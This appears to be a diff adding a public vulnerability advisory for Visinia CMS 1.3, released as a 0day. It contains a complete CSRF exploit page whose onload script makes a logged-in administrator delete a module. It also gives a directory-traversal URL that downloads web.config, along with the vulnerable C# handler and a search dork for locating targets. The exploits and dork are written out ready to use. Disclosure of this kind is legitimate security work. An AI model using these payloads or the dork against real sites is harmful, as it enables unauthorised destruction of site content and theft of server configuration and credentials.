@@ -1,0 +1,132 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ <  Day 3 (0day)
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+'''
+
+Abysssec Inc Public Advisory
+ 
+ 
+  Title            :  Visinia Multiple Vulnerabilities
+  Affected Version :  Visinia 1.3
+  Discovery        :  www.abysssec.com
+  Vendor	       :  http://www.visinia.com/
+  Download Links   :  http://visinia.codeplex.com/releases
+  Dork		       :  "Powered by visinia"
+		      
+  Admin Page       :  http://Example.com/Login.aspx
+ 
+Description :
+===========================================================================================      
+  This version of Visinia have Multiple Valnerabilities : 
+
+        1- CSRF for Remove Modules
+	2- LFI for download web.config or any file
+
+
+
+CSRF for Remove Modules:
+===========================================================================================     
+
+  With this vulnerability you can navigate the admin to visit malicious  site (when he is already logged in) 
+  to remove a Module with a POST request to server.
+
+  In this path the Module will be removed:
+         http://Example.com/Admin/Pages/System/Modules/ModuleController.aspx?DeleteModule=True&ModuleId=159   
+
+  for removing other modules you need to just change ModuleId.
+ 
+ 
+  The Source of HTML Page (Malicious  script) is here: 
+  ----------------------------------------------------------------------------------------
+<html>
+<head>
+<title >Wellcome to My Site!</title>
+Hello!
+...
+...
+...
+This page remove Modules in Visinia CMS. 
+
+<script>          
+        function RemoveModule() {            
+            try {
+                netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
+            } catch (e) {}
+
+            var http = false;
+            if (window.XMLHttpRequest) {
+                http = new XMLHttpRequest();
+            }
+            else if (window.ActiveXObject) {
+                http = new ActiveXObject("Microsoft.XMLHTTP");                
+            }
+
+            url = "http://Example.com/Admin/Pages/System/Modules/ModuleController.aspx?DeleteModule=True&ModuleId=159";
+            http.onreadystatechange = done;
+            http.open('POST', url, true);
+            http.send(null);
+        }
+        function done() {
+            if (http.readyState == 4 && http.status == 200) 
+            {               
+            }
+        }     
+</script>
+</head>
+<body onload ="RemoveModule();">
+</body>
+</html>
+
+  ----------------------------------------------------------------------------------------
+
+
+File Disclosure Vulnerability:
+===========================================================================================     
+
+  using this path you can download web.config file from server.
+         http://Example.com/image.axd?picture=viNews/../../web.config
+  
+  The downloaded file is image.axd, while after downloading you find that the content of
+  image.axd is web.config. 
+
+  Vulnerable Code is in this DLL    : visinia.SmartEngine.dll 
+  and this Method : ProcessRequest(HttpContext context) 
+
+  --------------------------------------------------------------------
+   public void ProcessRequest(HttpContext context)
+   {
+    if (!string.IsNullOrEmpty(context.Request.QueryString["picture"]))
+    {
+        string fileName = context.Request.QueryString["picture"];     // Give the file from URL
+        string folder = WebRoots.GetResourcesRoot();
+        try
+        {
+            FileInfo fi = new FileInfo(context.Server.MapPath(folder) + fileName);
+            int index = fileName.LastIndexOf(".") + 1;
+            string extension = fileName.Substring(index).ToLower();
+            if (string.Compare(extension, "jpg") == 0)
+            {
+                context.Response.ContentType = "image/jpeg";
+            }
+            else
+            {
+                context.Response.ContentType = "image/" + extension;
+            }
+            context.Response.TransmitFile(fi.FullName);              // Put the file in 'Response' for downloading without any check
+        }
+        catch
+        {
+        }
+    }
+   }
+
+
+
+===========================================================================================
+ 
+feel free to contact me : shahin [at] abysssec.com
